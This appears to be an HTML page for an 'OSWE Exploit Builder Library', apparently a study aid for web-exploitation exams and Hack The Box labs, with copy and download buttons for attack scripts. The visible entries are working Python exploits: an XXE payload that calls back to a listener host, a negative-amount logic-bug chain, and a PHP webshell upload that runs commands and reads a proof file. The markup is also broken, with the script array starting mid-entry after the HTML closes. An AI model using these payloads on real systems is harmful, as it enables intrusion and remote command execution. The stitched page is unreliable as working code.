<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>OSWE Exploit Builder Library</title>
  <style>
    :root {
      --bg: #f5f2ea;
      --surface: #fffefa;
      --surface-2: #fbfaf5;
      --ink: #20231f;
      --muted: #687069;
      --line: #d8d1c3;
      --accent: #0f766e;
      --blue: #174ea6;
      --red: #b42318;
      --amber: #8a5a00;
      --violet: #6842b8;
      --green: #59621f;
      --code: #202621;
      --code-ink: #edf2ec;
      --radius: 8px;
    }

    * { box-sizing: border-box; }

    html { scroll-behavior: smooth; }

    body {
      margin: 0;
      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      color: var(--ink);
      background: var(--bg);
    }

    button,
    input {
      font: inherit;
    }

    button {
      cursor: pointer;
    }

    main {
      max-width: 1420px;
      margin: 0 auto;
      padding: 18px;
    }

    h1 {
      margin: 0 0 10px;
      font-size: clamp(30px, 5vw, 56px);
      line-height: 1;
      letter-spacing: 0;
    }

    h2 {
      margin: 0 0 8px;
      font-size: 21px;
      letter-spacing: 0;
    }

    h3 {
      margin: 0;
      font-size: 15px;
      letter-spacing: 0;
    }

    p {
      margin: 0;
      color: var(--muted);
      line-height: 1.45;
    }

    .workspace {
      display: grid;
      grid-template-columns: 360px minmax(0, 1fr);
      gap: 18px;
      margin-top: 0;
      align-items: start;
    }

    .sidebar {
      position: sticky;
      top: 12px;
      border: 1px solid var(--line);
      border-radius: var(--radius);
      background: var(--surface);
      padding: 14px;
      max-height: calc(100vh - 24px);
      overflow: auto;
    }

    .search {
      width: 100%;
      border: 1px solid var(--line);
      border-radius: var(--radius);
      background: var(--surface-2);
      padding: 10px 11px;
      color: var(--ink);
      margin-bottom: 12px;
    }

    .filters {
      display: flex;
      gap: 7px;
      flex-wrap: wrap;
      margin-bottom: 12px;
    }

    .filter {
      border: 1px solid var(--line);
      border-radius: 999px;
      background: var(--surface-2);
      color: var(--muted);
      padding: 6px 9px;
      font-size: 12px;
      font-weight: 800;
    }

    .filter[aria-pressed="true"] {
      border-color: rgba(15, 118, 110, .5);
      background: #e3f1ed;
      color: #063b36;
    }

    .script-list {
      display: grid;
      gap: 7px;
    }

    .category-heading {
      margin: 11px 0 2px;
      color: var(--muted);
      font-size: 11px;
      font-weight: 900;
      letter-spacing: 0;
      text-transform: uppercase;
    }

    .category-heading:first-child {
      margin-top: 0;
    }

    .script-button {
      width: 100%;
      border: 1px solid var(--line);
      border-radius: 6px;
      background: var(--surface-2);
      color: var(--ink);
      text-align: left;
      padding: 10px;
      display: grid;
      gap: 5px;
    }

    .script-button[aria-pressed="true"] {
      border-color: rgba(15, 118, 110, .55);
      background: #e3f1ed;
    }

    .button-title {
      font-weight: 850;
      font-size: 13px;
    }

    .button-meta {
      color: var(--muted);
      font-size: 12px;
    }

    .source-meta {
      color: var(--accent);
      font-size: 11px;
      font-weight: 800;
    }

    .content {
      display: grid;
      gap: 16px;
      min-width: 0;
    }

    .panel {
      border: 1px solid var(--line);
      border-radius: var(--radius);
      background: var(--surface);
      overflow: hidden;
      min-width: 0;
    }

    .panel-head {
      padding: 16px;
      border-bottom: 1px solid var(--line);
      background: var(--surface-2);
      display: grid;
      grid-template-columns: minmax(0, 1fr) auto;
      gap: 14px;
      align-items: start;
    }

    .meta-row {
      display: flex;
      gap: 7px;
      flex-wrap: wrap;
      margin: 10px 0 0;
    }

    .pill {
      display: inline-flex;
      width: fit-content;
      border-radius: 999px;
      color: #fff;
      padding: 4px 8px;
      font-size: 12px;
      font-weight: 850;
      white-space: nowrap;
    }

    .type-start { background: var(--blue); }
    .type-replace { background: var(--red); }
    .type-add { background: var(--accent); }
    .type-example { background: var(--green); }
    .area-main { background: var(--blue); }
    .area-login { background: var(--amber); }
    .area-exploit { background: var(--red); }
    .area-listener { background: var(--violet); }
    .area-helper { background: var(--accent); }
    .area-example { background: var(--green); }
    .source-pill { background: #334155; }

    .actions {
      display: flex;
      gap: 8px;
      align-items: start;
      flex-wrap: wrap;
      justify-content: end;
      max-width: 340px;
    }

    .action {
      border: 1px solid var(--accent);
      border-radius: var(--radius);
      color: #063b36;
      background: #e3f1ed;
      padding: 9px 11px;
      font-weight: 850;
      white-space: nowrap;
    }

    .secondary {
      border-color: var(--line);
      background: var(--surface);
      color: var(--ink);
    }

    .action-status {
      width: 100%;
      min-height: 18px;
      color: var(--muted);
      font-size: 12px;
      text-align: right;
    }

    .copy-buffer {
      position: fixed;
      left: -9999px;
      top: 0;
      width: 1px;
      height: 1px;
      opacity: 0;
    }

    pre {
      margin: 0;
      padding: 16px;
      overflow: auto;
      background: var(--code);
      color: var(--code-ink);
      font: 13px/1.55 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      min-height: calc(100vh - 150px);
      max-height: 720px;
    }

    .empty {
      display: none;
      color: var(--muted);
      padding: 12px;
      border: 1px dashed var(--line);
      border-radius: var(--radius);
      background: var(--surface-2);
      font-size: 14px;
    }

    @media (max-width: 1040px) {
      .workspace { grid-template-columns: 1fr; }
      .sidebar { position: static; max-height: none; }
    }

    @media (max-width: 660px) {
      main { padding: 20px 14px 32px; }
      .panel-head { grid-template-columns: 1fr; }
      .actions { justify-content: start; }
      pre { max-height: none; }
    }
  </style>
</head>
<body>
  <main>

    <section class="workspace">
      <aside class="sidebar" aria-label="Script library controls">
        <input class="search" type="search" placeholder="Search scripts, areas, techniques..." aria-label="Search scripts">
        <div class="filters" aria-label="Script category filters">
          <button class="filter" data-filter="all" aria-pressed="true">All</button>
          <button class="filter" data-filter="Start" aria-pressed="false">Start</button>
          <button class="filter" data-filter="Authentication" aria-pressed="false">Auth</button>
          <button class="filter" data-filter="SQL Injection" aria-pressed="false">SQLi</button>
          <button class="filter" data-filter="NoSQL / LDAP / XPath" aria-pressed="false">NoSQL</button>
          <button class="filter" data-filter="XSS / CSRF / CORS" aria-pressed="false">XSS</button>
          <button class="filter" data-filter="SSRF / OOB / Listener" aria-pressed="false">SSRF/OOB</button>
          <button class="filter" data-filter="Upload / Webshell" aria-pressed="false">Upload</button>
          <button class="filter" data-filter="Deserialization" aria-pressed="false">Deser</button>
          <button class="filter" data-filter="Second-Order / WebSocket" aria-pressed="false">2nd/WS</button>
          <button class="filter" data-filter="Logic / Race / Timing" aria-pressed="false">Logic</button>
          <button class="filter" data-filter="Helpers" aria-pressed="false">Helpers</button>
          <button class="filter" data-filter="Examples" aria-pressed="false">Examples</button>
        </div>
        <div class="script-list" aria-label="Scripts"></div>
        <div class="empty">No scripts match this filter.</div>
      </aside>

      <div class="content">

        <article class="panel" id="script-panel">
          <div class="panel-head">
            <div>
              <h2 id="script-title"></h2>
              <p id="script-summary"></p>
              <div class="meta-row">
                <span id="script-type" class="pill"></span>
                <span id="script-area" class="pill"></span>
                <span id="script-slot" class="pill area-helper"></span>
                <span id="script-source" class="pill source-pill"></span>
              </div>
            </div>
            <div class="actions">
              <button class="action" id="copy-active" type="button">Copy code</button>
              <button class="action secondary" id="download-active" type="button">Download</button>
              <p class="action-status" id="action-status" aria-live="polite"></p>
            </div>
          </div>
          <pre><code id="script-code"></code></pre>
          <textarea class="copy-buffer" id="copy-buffer" aria-hidden="true" tabindex="-1"></textarea>
        </article>
      </div>
    </section>
  </main>

            "code": "#!/usr/bin/env python3\nimport requests\n\nTARGET = \"http://target\"            # EDIT\nCALLBACK_HOST = \"127.0.0.1\"         # EDIT\nCALLBACK_PORT = 8000                # EDIT\nTRIGGER_PATH = \"/api/import\"        # EDIT\n\ns = requests.Session()\ns.verify = False\n\ndef exploit():\n    xml = f\"\"\"<?xml version=\"1.0\"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM \"http://{CALLBACK_HOST}:{CALLBACK_PORT}/hit\">]>\n<data>&xxe;</data>\n\"\"\"\n    r = s.post(f\"{TARGET}{TRIGGER_PATH}\", data=xml, headers={\"Content-Type\": \"application/xml\"})\n    print(f\"submitted: {r.status_code}\")\n\nif __name__ == \"__main__\":\n    exploit()\n"
      },
      {
            "id": "example-logic-bug-full-chain",
            "title": "HTB EXAMPLE - Parameter Logic Bug Chain",
            "type": "HTB EXAMPLE",
            "area": "Example",
            "slot": "complete example",
            "summary": "Complete sanitized logic-bug script showing validation/commit disparity and proof printing.",
            "filename": "example_parameter_logic_bug_chain.py",
            "code": "#!/usr/bin/env python3\nimport requests\n\nTARGET = \"http://target\"            # EDIT\nPROXY = None\nCHECK_PATH = \"/api/check\"           # EDIT\nCOMMIT_PATH = \"/api/commit\"         # EDIT\n\ns = requests.Session()\ns.proxies = PROXY\ns.verify = False\n\ndef main():\n    valid = {\"slot\": \"normal\", \"amount\": 1}\n    changed = {\"slot\": \"restricted\", \"amount\": -100}\n    check = s.post(f\"{TARGET}{CHECK_PATH}\", json=valid)\n    print(f\"check: {check.status_code} {check.text[:200]}\")\n    commit = s.post(f\"{TARGET}{COMMIT_PATH}\", json={**valid, **changed})\n    print(f\"commit: {commit.status_code}\")\n    print(commit.text[:1000])\n\nif __name__ == \"__main__\":\n    main()\n"
      },
      {
            "id": "example-upload-webshell-full-chain",
            "title": "HTB EXAMPLE - Upload Webshell RCE",
            "type": "HTB EXAMPLE",
            "area": "Example",
            "slot": "complete example",
            "summary": "Complete sanitized upload-to-command-execution chain.",
            "filename": "example_upload_webshell_rce.py",
            "code": "#!/usr/bin/env python3\nimport requests\n\nTARGET = \"http://target\"            # EDIT\nPROXY = None\nUPLOAD_PATH = \"/upload\"             # EDIT\nSHELL_URL = \"/uploads/shell.php\"    # EDIT\n\ns = requests.Session()\ns.proxies = PROXY\ns.verify = False\n\ndef build_shell():\n    return b\"<?php system($_GET['cmd'] ?? 'id'); ?>\"\n\ndef run_cmd(cmd):\n    r = s.get(f\"{TARGET}{SHELL_URL}\", params={\"cmd\": cmd})\n    r.raise_for_status()\n    return r.text.strip()\n\ndef main():\n    files = {\"file\": (\"shell.php\", build_shell(), \"application/x-php\")}\n    s.post(f\"{TARGET}{UPLOAD_PATH}\", files=files).raise_for_status()\n    print(run_cmd(\"id\"))\n    print(run_cmd(\"cat /proof.txt\"))\n\nif __name__ == \"__main__\":\n    main()\n"
      }
];

    const typeClasses = {
      "START HERE": "type-start",
      "REPLACE": "type-replace",
      "ADD": "type-add",
      "HTB EXAMPLE": "type-example"
    };

    const areaClasses = {
      "Main": "area-main",
      "Login": "area-login",
      "Exploit": "area-exploit",
      "Listener": "area-listener",
      "Helper": "area-helper",
      "Example": "area-example"
    };

    const sourceTags = {
      "exploit-nosql-form-match-dump": "Skeleton Script 1",
      "exploit-ldap-prefix-dump": "Skeleton Script 1",
      "exploit-ssrf-two-step-iframe": "Skeleton Script 2",
      "exploit-nosql-regex-dump": "Skeleton Script 3",
      "example-nosql-regex-full-chain": "Skeleton Script 3",
      "listener-https-b64": "Skeleton Script 4",
      "exploit-boolean-sqli-dump": "Skeleton Scripts 5-10",
      "exploit-boolean-sqli-bisect": "Skeleton Scripts 5-10",
      "exploit-boolean-sqli-row-count": "Skeleton Scripts 5-10",
      "exploit-cookie-sqli-oracle": "Skeleton Scripts 5-10",
      "exploit-time-sqli-bitwise": "Skeleton Scripts 5-10",
      "exploit-mssql-openrowset-file-read": "Skeleton Scripts 5-10",
      "exploit-token-auth-sleep-file-dump": "Skeleton Scripts 11-12",
      "exploit-command-injection-sleep-dump": "Skeleton Scripts 11-12"
    };

    const categoryOrder = [
      "Start",
      "Authentication",
      "SQL Injection",
      "NoSQL / LDAP / XPath",
      "XSS / CSRF / CORS",
      "SSRF / OOB / Listener",
      "Upload / Webshell",
      "Command Injection / SSTI",
      "Deserialization",
      "Prototype / Node",
      "Second-Order / WebSocket",
      "File Read / Traversal",
      "Logic / Race / Timing",
      "Helpers",
      "Examples"
    ];

    function categoryFor(script) {
      const text = `${script.id} ${script.title} ${script.area} ${script.summary}`.toLowerCase();
      if (script.type === "START HERE") return "Start";
      if (script.type === "HTB EXAMPLE") return "Examples";
      if (script.type === "ADD") return "Helpers";
      if (text.includes("login") || text.includes("jwt") || text.includes("auth") || text.includes("cookie forge")) return "Authentication";
      if (text.includes("sqli") || text.includes("sql ") || text.includes("postgresql") || text.includes("mssql") || text.includes("openrowset") || text.includes("outfile")) return "SQL Injection";
      if (text.includes("nosql") || text.includes("ldap") || text.includes("xpath")) return "NoSQL / LDAP / XPath";
      if (text.includes("xss") || text.includes("csrf") || text.includes("cors") || text.includes("exfil")) return "XSS / CSRF / CORS";
      if (text.includes("ssrf") || text.includes("oob") || text.includes("listener") || text.includes("dns rebinding") || text.includes("callback") || text.includes("smuggling") || text.includes("cache poison")) return "SSRF / OOB / Listener";
      if (text.includes("upload") || text.includes("webshell") || text.includes("phar")) return "Upload / Webshell";
      if (text.includes("command injection") || text.includes("ssti") || text.includes("run_cmd") || text.includes("command endpoint")) return "Command Injection / SSTI";
      if (text.includes("deser") || text.includes("serialized") || text.includes("ysoserial") || text.includes("pop chain")) return "Deserialization";
      if (text.includes("prototype") || text.includes("node eval")) return "Prototype / Node";
      if (text.includes("second-order") || text.includes("websocket")) return "Second-Order / WebSocket";
      if (text.includes("path traversal") || text.includes("file read") || text.includes("proof file")) return "File Read / Traversal";
      if (text.includes("logic") || text.includes("race") || text.includes("timing") || text.includes("password reset") || text.includes("negative amount")) return "Logic / Race / Timing";
      return script.area || "Other";
    }

    function scriptWeight(script) {
      if (script.id === "main-full-chain") return 0;
      if (script.type === "START HERE") return 10;
      if (script.type === "REPLACE") return 20;
      if (script.type === "ADD") return 30;
      if (script.type === "HTB EXAMPLE") return 40;
      return 50;
    }

    let activeFilter = "all";
    let activeScript = scripts.find((script) => script.id === "main-full-chain") || scripts[0];

    const search = document.querySelector(".search");
    const list = document.querySelector(".script-list");
    const empty = document.querySelector(".empty");
    const filters = document.querySelectorAll(".filter");
    const title = document.querySelector("#script-title");
    const summary = document.querySelector("#script-summary");
    const type = document.querySelector("#script-type");
    const area = document.querySelector("#script-area");
    const slot = document.querySelector("#script-slot");
    const source = document.querySelector("#script-source");
    const code = document.querySelector("#script-code");
    const copy = document.querySelector("#copy-active");
    const download = document.querySelector("#download-active");
    const status = document.querySelector("#action-status");
    const copyBuffer = document.querySelector("#copy-buffer");

    function setStatus(message) {
      status.textContent = message;
      if (message) {
        setTimeout(() => {
          if (status.textContent === message) status.textContent = "";
        }, 3500);
      }
    }

    function selectCodeForManualCopy() {
      const selection = window.getSelection();
      const range = document.createRange();
      range.selectNodeContents(code);
      selection.removeAllRanges();
      selection.addRange(range);
    }

    function legacyCopy(text) {
      copyBuffer.value = text;
      copyBuffer.removeAttribute("aria-hidden");
      copyBuffer.focus();
      copyBuffer.select();
      const ok = document.execCommand && document.execCommand("copy");
      copyBuffer.setAttribute("aria-hidden", "true");
      return ok;
    }

    async function copyText(text) {
      try {
        if (navigator.clipboard && window.isSecureContext) {
          await navigator.clipboard.writeText(text);
          return true;
        }
      } catch (error) {
        // Notion desktop/app embeds can block Clipboard API inside iframes.
      }

      try {
        if (legacyCopy(text)) return true;
      } catch (error) {
        // Fall through to manual selection below.
      }

      selectCodeForManualCopy();
      return false;
    }

    function scriptMatches(script) {
      const q = search.value.trim().toLowerCase();
      const category = categoryFor(script);
      const sourceTag = sourceTags[script.id] || "";
      const haystack = [
        script.title,
        script.type,
        script.area,
        category,
        script.slot,
        script.summary,
        sourceTag,
        script.code
      ].join(" ").toLowerCase();

      const filterMatch = activeFilter === "all" || category === activeFilter;
      return filterMatch && (!q || haystack.includes(q));
    }

    function renderList() {
      const matches = scripts.filter(scriptMatches);
      list.innerHTML = "";
      empty.style.display = matches.length ? "none" : "block";

      categoryOrder.forEach((category) => {
        const group = matches
          .filter((script) => categoryFor(script) === category)
          .sort((a, b) => scriptWeight(a) - scriptWeight(b) || a.title.localeCompare(b.title));
        if (!group.length) return;

        const heading = document.createElement("div");
        heading.className = "category-heading";
        heading.textContent = `${category} (${group.length})`;
        list.appendChild(heading);

        group.forEach((script) => {
          const sourceTag = sourceTags[script.id] || "";
        const button = document.createElement("button");
        button.className = "script-button";
        button.type = "button";
        button.dataset.id = script.id;
        button.setAttribute("aria-pressed", String(script.id === activeScript.id));
        button.innerHTML = `
          <span class="button-title">${script.title}</span>
          <span class="button-meta">${script.type} / ${script.slot}</span>
          ${sourceTag ? `<span class="source-meta">${sourceTag}</span>` : ""}
        `;
        button.addEventListener("click", () => activate(script.id));
        list.appendChild(button);
        });
      });
    }

    function activate(id) {
      activeScript = scripts.find((script) => script.id === id) || scripts[0];
      title.textContent = activeScript.title;
      summary.textContent = activeScript.summary;
      type.textContent = activeScript.type;
      type.className = `pill ${typeClasses[activeScript.type]}`;
      area.textContent = categoryFor(activeScript);
      area.className = `pill ${areaClasses[activeScript.area] || "area-exploit"}`;
      slot.textContent = activeScript.slot;
      source.textContent = sourceTags[activeScript.id] || "";
      source.style.display = source.textContent ? "inline-flex" : "none";
      code.textContent = activeScript.code.trim();
      setStatus("");
      renderList();
    }

    filters.forEach((button) => {
      button.addEventListener("click", () => {
        activeFilter = button.dataset.filter;
        filters.forEach((item) => {
          item.setAttribute("aria-pressed", String(item === button));
        });
        renderList();
      });
    });

    search.addEventListener("input", renderList);

    copy.addEventListener("click", async () => {
      const ok = await copyText(activeScript.code.trim());
      copy.textContent = ok ? "Copied" : "Selected";
      setStatus(ok ? "Copied to clipboard." : "Notion blocked clipboard. Press Ctrl+C now.");
      setTimeout(() => copy.textContent = "Copy code", 1100);
    });

    download.addEventListener("click", () => {
      try {
        const blob = new Blob([activeScript.code.trim() + "\n"], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.href = url;
        link.download = activeScript.filename;
        link.rel = "noopener";
        document.body.appendChild(link);
        link.click();
        link.remove();
        setTimeout(() => URL.revokeObjectURL(url), 1000);
        setStatus("Download started. If Notion blocks it, use Copy code.");
      } catch (error) {
        selectCodeForManualCopy();
        setStatus(`Download blocked. Press Ctrl+C and save as ${activeScript.filename}.`);
      }
    });

    activate(activeScript.id);
  </script>
</body>
</html>
